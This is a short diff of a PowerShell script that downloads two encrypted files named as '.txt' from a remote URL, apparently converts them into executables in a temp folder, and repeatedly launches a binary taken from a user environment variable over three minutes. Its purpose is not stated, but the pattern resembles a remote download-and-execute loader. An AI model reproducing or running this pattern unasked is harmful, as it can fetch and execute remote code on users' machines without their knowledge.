@@ -33,8 +33,8 @@ Function Get-Executable {
         $SaclExe = "$TmpDir\sacl.exe"
         $Url1 = $Url + "ssot.txt"
         $Url2 = $Url + "sacl.txt"
-        (New-Object System.Net.WebClient).DownloadFile($Url1, $SsotExeCipher)
-        (New-Object System.Net.WebClient).DownloadFile($Url2, $SaclExeCipher)
+       NetGetFileNoCache $Url1 $SsotExeCipher
+        NetGetFileNoCache $Url2 $SaclExeCipher
         if(-not(Test-Path -Path $SsotExeCipher)){
             throw "ERROR ON DOWNLOAD OF $Url1 $SsotExeCipher"
         }
@@ -79,6 +79,6 @@ $End = $Start.AddMinutes(3)
 Do{
     Log-String "Caling Global:SSHOTEXE"
     $Exec = [System.Environment]::GetEnvironmentVariable('SSHOTEXE',[System.EnvironmentVariableTarget]::User)
-    $process = Start-Process -FilePath $Exec -Wait -NoNewWindow -PassThru
+    &"$Exec"
     Start-Sleep -Seconds 30
 }While ((Get-Date) -lt $End)
